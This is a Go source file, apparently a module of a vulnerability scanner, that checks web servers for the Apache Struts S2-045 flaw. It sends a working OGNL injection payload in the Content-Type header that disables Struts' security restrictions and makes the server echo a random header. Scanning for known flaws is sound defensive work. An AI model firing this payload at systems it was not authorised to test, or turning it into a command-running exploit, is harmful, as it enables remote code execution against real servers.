package struts

import (
	"io"
	"io/ioutil"
	"net/http"
	"strings"

	"project/internal/logger"
	"project/internal/random"
)

type st2045 struct {
}

func newSt2045() *st2045 {
	return nil
}

func (st2045) Check(client *http.Client, lg logger.Logger, url, ua string) (bool, error) {
	req, err := http.NewRequest(http.MethodPost, url, nil)
	if err != nil {
		return false, err
	}
	// set random header for validate vulnerability is exist
	randomKey := random.String(16)
	randomValue := random.String(16)
	const p = "" +
		"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
		"(#_memberAccess?(#_memberAccess=#dm):" +
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
		"(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())." +
		"(#context.setMemberAccess(#dm)))).(#_='multipart/form-data')." +
		"(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']." +
		"addHeader('p1', 'p2'))}"
	payload := strings.ReplaceAll(p, "p1", randomKey)
	payload = strings.ReplaceAll(payload, "p2", randomValue)
	lg.Println(logger.Info, "", "\npayload:\n"+payload)
	// set payload to header
	header := req.Header
	header.Set("Content-Type", payload)
	header.Set("User-Agent", ua)
	// send request
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer client.CloseIdleConnections()
	defer func() { _ = resp.Body.Close() }()
	_, err = io.Copy(ioutil.Discard, resp.Body)
	if err != nil {
		return false, err
	}
	lg.Println(logger.Info, "", "header:")
	for key, value := range resp.Header {
		lg.Printf(logger.Info, "key: \"%s\", value: %v\n", key, value)
	}
	return resp.Header.Get(randomKey) == randomValue, nil
}
